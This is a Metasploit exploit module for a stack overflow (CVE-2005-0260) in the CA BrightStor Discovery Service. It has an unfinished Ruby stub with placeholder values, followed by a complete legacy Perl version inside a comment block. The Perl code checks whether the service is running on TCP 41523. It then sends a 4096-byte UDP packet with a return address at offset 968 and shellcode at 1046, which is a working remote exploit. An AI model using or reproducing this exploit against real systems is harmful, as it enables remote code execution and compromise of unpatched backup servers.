require 'msf/core'

module Msf

class Exploits::Windows::XXX_CHANGEME_XXX < Msf::Exploit::Remote

	include Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'CA BrightStor Discovery Service Overflow',
			'Description'    => %q{
				This module exploits a vulnerability in the CA BrightStor
				Discovery Service. This vulnerability occurs when a large
				request is sent to UDP port 41524, triggering a stack
				overflow.
					
			},
			'Author'         => [ 'hdm' ],
			'Version'        => '$Revision$',
			'References'     =>
				[
					[ 'OSVDB', '13613'],
					[ 'BID', '12491'],
					[ 'CVE', '2005-0260'],
					[ 'URL', 'http://www.idefense.com/application/poi/display?id=194&type=vulnerabilities'],
					[ 'MIL', '14'],

				],
			'Privileged'     => true,
			'Payload'        =>
				{
					'Space'    => 2048,
					'BadChars' => "\x00",
					'Prepend'  => "\x81\xc4\x54\xf2\xff\xff",

				},
			'Targets'        => 
				[
					[ 
						'Automatic Targetting',
						{
							'Platform' => 'win32, win2000, winxp, win2003',
							'Ret'      => 0x0,
						},
					],
				],
			'DisclosureDate' => 'Dec 20 2004',
			'DefaultTarget' => 0))
	end

	def exploit
		connect
		
		handler
		disconnect
	end

=begin

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::cabrightstor_disco;
use base "Msf::Exploit";
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	'Name'     => 'CA BrightStor Discovery Service Overflow',
	'Version'  => '$Revision$',
	'Authors'  => [ 'Thor Doomen <syscall [at] hushmail.com>' ],
	'Arch'     => [ 'x86' ],
	'OS'       => [ 'win32', 'win2000', 'winxp', 'win2003' ],
	'Priv'     => 1,
	'AutoOpts' => { 'EXITFUNC' => 'process' },

	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 41524],
	  },

	'Payload' =>
	  {
		'Space'     => 2048,
		'BadChars'  => "\x00",
		'Prepend' => "\x81\xc4\x54\xf2\xff\xff",	# add esp, -3500
		'Keys'		=> ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
		This module exploits a vulnerability in the CA BrightStor
		Discovery Service. This vulnerability occurs when a large
		request is sent to UDP port 41524, triggering a stack
		overflow.
}),

	'Refs'    =>
	  [
	  	['OSVDB', '13613'],
		['BID',	'12491'],
		['CVE',	'2005-0260'],
		['URL',	'http://www.idefense.com/application/poi/display?id=194&type=vulnerabilities'],
		['MIL', '14'],		
	  ],

	'Targets' =>
	  [
		['cheyprod.dll 12/12/2003', 0x23808eb0], # call to edi reg
	  ],

	'Keys'    => ['brightstor'],

	'DisclosureDate' => 'Dec 20 2004',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Check {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = 41523;

	# Connection #1 should not receive a response
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("META");
	my $res = $s->Recv(-1, 1);
	$s->Close;

	if ($res) {
		$self->PrintLine("[*] The discovery returned a strange response: $res");
	}

	# Connection #2 should receive the hostname of the target
	my $s = Msf::Socket::Tcp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return $self->CheckCode('Connect');
	}

	$s->Send("hMETA");
	my $res = $s->Recv(-1, 1);
	$s->Close;

	if (! $res) {
		$self->PrintLine("[*] The discovery service did not respond to our query");
		return $self->CheckCode('Generic');
	}

	$self->PrintLine("[*] Discovery service active on host: $res");
	return $self->CheckCode('Detected');
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target = $self->Targets->[$target_idx];

	$self->PrintLine("[*] Attempting to exploit target " . $target->[0]);

	my $s = Msf::Socket::Udp->new
	  (
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	  );

	if ($s->IsError) {
		$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
		return;
	}

	my $bang = "X" x 4096;

	# esp @ 971
	# ret @ 968
	# edi @ 1046
	# end = 4092

	substr($bang, 968, 4, pack('V', $target->[1]));
	substr($bang, 1046, length($shellcode), $shellcode);

	$self->PrintLine("[*] Sending " .length($bang) . " bytes to remote host.");
	$s->Send($bang);
	$s->Recv(-1, 5);

	return;
}

1;

=end


end
end	
